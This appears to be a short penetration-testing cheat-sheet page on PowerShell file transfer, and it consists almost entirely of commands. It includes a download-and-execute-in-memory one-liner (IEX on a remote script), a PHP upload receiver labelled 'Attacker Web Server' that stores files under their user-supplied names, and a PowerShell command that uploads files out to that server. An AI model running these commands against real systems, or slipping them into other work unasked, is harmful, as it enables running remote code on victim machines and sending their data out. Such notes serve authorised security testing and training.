# Powershell

PowerShell can be leveraged in Windows >= 7, Windows Server >= 2008

### Download to Disk

```
PS C:\> powershell -c "(New-Object System.Net.Webclient).DownloadFile('http://127.0.0.1/some.file', 'some.file')"
```

```
C:\> powershell.exe (New-Object System.Net.WebClient).DownloadFile('http://127.0.0.1/some.file', 'some.file')
```

### Download and execute from Memory

```
PS C:\> IEX (New-Object System.Net.WebClient).DownloadString('http://10.10.10.1/file.ps1')
```

### Example: Uploading via PHP Upload Script

```
// Location: Attacker Web Server
<?php
    $uploaddir = '/var/www/uploads/';
    $uploadfile = $uploaddir . $_FILES['file']['name'];
    move_uploaded_file($_FILES['file']['tmp_name'], $uploadfile)
?>
```

{% hint style="info" %}
Place upload.php in /var/www/html/

Create /var/www/uploads and chown to www-root for use with Apache webserver
{% endhint %}

```
c:\> powershell -c (New-Object System.Net.WebClient).UploadFile('http://ip.address/upload.php', 'file.name')
```
